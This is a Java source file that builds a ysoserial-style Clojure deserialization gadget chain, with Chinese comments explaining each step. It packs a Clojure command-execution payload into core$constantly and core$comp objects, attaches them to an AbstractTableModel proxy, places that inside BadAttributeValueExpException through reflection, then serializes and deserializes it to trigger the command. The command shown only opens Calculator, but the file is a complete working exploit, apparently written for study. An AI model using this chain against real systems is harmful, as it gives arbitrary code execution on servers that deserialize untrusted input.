package org.su18.serialize.ysoserial.Clojure;

import clojure.core$comp$fn__4727;
import clojure.core$constantly$fn__4614;
import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import org.su18.serialize.utils.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author su18
 */
public class Clojure {

	public static void main(String[] args) throws Exception {

		// 执行系统命令的两种写法，本质都是使用 java.lang.Runtime 类
		String payload1 = "(import 'java.lang.Runtime)\n" +
				"(. (Runtime/getRuntime) exec\"open -a Calculator.app\")";

		String payload2 = "(use '[clojure.java.shell :only [sh]])\n" +
				"(sh\"open\" \"-a\" \"Calculator.app\")";

		// 初始化 AbstractTableModel$ff19274a 对象
		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();

		HashMap<Object, Object> map = new HashMap<>();

		// 使用 core$constantly$fn__4614 保存 payload 对象，调用其 invoke 方法时会返回 payload
		core$constantly$fn__4614 core1 = new core$constantly$fn__4614(payload2);
		// 将 core$constantly$fn__4614 和 main$eval_opt 保存在 core$comp$fn__4727 中
		core$comp$fn__4727 core2 = new core$comp$fn__4727(core1, new clojure.main$eval_opt());


		// 将 hashCode 与 core$comp$fn__4727 进行映射
		map.put("hashCode", core2);
		model.__initClojureFnMappings(PersistentArrayMap.create(map));

		// 使用 HashMap hashCode 触发
//		HashMap<Object, Object> hashMap = new HashMap<>();
//		hashMap.put(model,"su18");
//		hashMap.put("su19","su20");
//		SerializeUtil.writeObjectToFile(hashMap, fileName);

		// 实例化 BadAttributeValueExpException 并反射写入
		BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
		Field                         field     = BadAttributeValueExpException.class.getDeclaredField("val");
		field.setAccessible(true);
		field.set(exception, model);

		// 使用 BadAttributeValueExpException toString 触发，还是会调用 hashCode 方法
		SerializeUtil.writeObjectToFile(exception);
		SerializeUtil.readFileObject();
	}

}
